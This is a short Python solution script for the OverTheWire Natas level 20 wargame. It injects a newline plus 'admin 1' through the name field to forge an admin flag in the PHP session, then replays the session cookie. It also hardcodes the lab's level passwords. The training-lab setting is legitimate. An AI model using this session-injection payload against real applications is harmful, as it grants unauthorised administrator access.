#!/bin/python3
import requests

user = "natas20"
passwd = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" 
url = "http://natas20.natas.labs.overthewire.org"
_data = {"name":"aaa\nadmin 1"}

httpreq = requests.post(url, auth=(user, passwd), headers={"Cookie":"PHPSESSID=njlkb373h5k9q92hdf57ggtl01"}, data=_data)
httpreq = requests.get(url, auth=(user, passwd), headers={"Cookie":"PHPSESSID=njlkb373h5k9q92hdf57ggtl01"})

print (httpreq.content)

# Username: natas21
# Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ